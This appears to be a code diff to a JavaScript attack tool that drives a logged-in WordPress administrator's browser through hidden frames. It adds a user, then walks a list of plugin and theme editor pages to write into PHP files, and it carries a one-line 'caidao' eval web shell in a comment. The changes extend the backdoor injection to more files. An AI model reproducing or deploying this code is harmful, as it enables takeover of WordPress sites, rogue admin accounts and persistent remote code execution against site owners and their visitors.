@@ -21,15 +21,15 @@ function initURL()
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Flanguages%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Ftemplates%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
-    g_strURLEditPHPPostPlugin=Common.getTargetHost()+"/wp-admin/plugin-editor.php";
-    g_strURLEditPHPPostTheme=Common.getTargetHost()+"/wp-admin/theme-editor.php";
+    g_strURLEditPHPPostPlugin=Common.getTargetHost()+"wp-admin/plugin-editor.php";
+    g_strURLEditPHPPostTheme=Common.getTargetHost()+"wp-admin/theme-editor.php";
 }
 
 //find the give child
 function findChild($element,array)
 {
     $elementReturn=null;
-    if($element!=null&&$element.length>0&&array!=null&&typeof(array.length)!=="undefined"&&array.length!=0)
+    if($element!=null&&$element.length>0&&array!=null&&typeof(array.length)!=="undefined"&&array.length!==0)
     {
         $elementReturn=$element;
         for(var i=0;i<array.length;++i)
@@ -103,7 +103,7 @@ function inPageEditPHP() {
                 }
                 catch(e)
                 {
-                    if(e!="success"&&e!="failed")
+                    if(e!=="success"&&e!=="failed")
                     {
                         //exception
                         console.log("exception in inPageEditPHP:"+e);
@@ -542,6 +542,7 @@ function frameOperationCalledFromSon(windowSon)
         else
         {
             //no more comment
+            alert("no more comment!");
         }
     }
     else if(windowSon.location.href===g_strURLAddUser)
@@ -554,11 +555,26 @@ function frameOperationCalledFromSon(windowSon)
         {
             //if has privilege i need php edit
             //<?php @eval($_POST['caidao']);?>
-            frameJumpTo(g_strURLEditPHPBBPress1);
+            g_strComunication=0;
+            frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
         }
         else
         {
             console.log("fatle error in adduser page,unrecognized g_strComunication:"+g_strComunication);
+        }
+    }
+    else if(windowSon.location.href.indexOf("plugin-editor.php")!==-1||windowSon.location.href.indexOf("theme-editor.php")!==-1)
+    {
+        g_strComunication++;
+        if(g_strComunication>=g_strURLEditPHPArray.length)
+        {
+            //no more php to edit,i need comment
+            frameJumpTo(g_strURLComment);
+        }
+        else
+        {
+            //next php to edit
+            frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
         }
     }
     else if(window.location.href.indexOf("wp-login.php?redirect_to")!==-1)
@@ -589,6 +605,10 @@ function frameOperation()
     {
         //add user
         inPageAddUser();
+    }
+    else if(window.location.href.indexOf("plugin-editor.php")!==-1||window.location.href.indexOf("theme-editor.php")!==-1)
+    {
+        inPageEditPHP();
     }
     else if(window.location.href===g_strURLComment)
     {
